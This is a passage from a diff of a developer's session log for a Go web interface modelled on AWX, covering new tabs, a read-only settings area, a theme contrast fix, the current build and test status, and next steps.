+the exact tab and page they were on (`web/preferences.go`, LESSONS_LEARNED #177).
+
+**Every view carries its AWX counterpart's tabs.** Implemented where a port exists:
+Organizations gained Teams, Inventories gained Access, Templates gained Schedules, Runbooks
+gained Templates. `"Completed jobs"` became `"Jobs"` because it never filtered to completed
+ones (FAILURE_PATTERNS #212). Declared in full where no port exists, each naming the
+specific gap (LESSONS_LEARNED #175).
+
+**A declared system settings area** at `/settings`, gated on the new `auth.ScopeSettingsRead`,
+covering AWX's five tiles. Nothing is editable and nothing renders a live control, because
+there is no settings store. **Role admin is settings access today, with no separate grant**
+(`auth.Identity.HasScope` lets `RoleAdmin` bypass every scope check).
+
+**Las Ventanas was structurally broken and is fixed.** The shell painted nothing, so every
+region that is not a `.block` rendered onto the Windows 95 desktop teal at roughly 1.5:1,
+while every contrast test passed because they measure against `--bg` and the text was on
+`--body-bg` (FAILURE_PATTERNS #215). The outer window bevel is a real border now, not an
+inset shadow the opaque children painted over. The pane divider and empty states use the
+bevel quartet rather than flat and dashed borders.
+
+### Where it stands
+
+- `go build ./...`, `go test ./internal/... ./cmd/...`, `make fmt`, `make vet`, `make arch`,
+  `make gosec`, `make docs-lint` and `templ generate` in-sync: all clean.
+- `go run ./tools/coverage-check -tolerant`, which is what `push-gate` runs, exits 0. The
+  four unrelated floor regressions seen earlier in the session do not reproduce.
+- `make ci` itself has NOT been run end to end.
+- The pre-commit gate passes with three warnings it does not refuse on: `chrome.go` (327
+  lines) and `systemsettings.go` (366) exceed the soft 300-line cap, and a pre-existing
+  error string in `field.go` opens with a capital.
+
+### Next steps
+
+1. Answer the Run-button question above.
+2. The list toolbar and a real pager, which needs a `Count` on each store and a
+   `Filterable` flag on `view.Field`. It is the largest remaining gap against AWX.
+3. The Devices Capabilities tab, declared now: the only screen that can answer why a task
+   was skipped on one device and not its neighbour.
+4. The settings area's fifth tile. AWX has six and the request named five.
+
 ## Previous session: Phase 40 complete, `make ci` cleared except its last test stage
 
 **Branch `feature/Phase-40-Run-Journal`. Phase 40's twenty build-order steps of
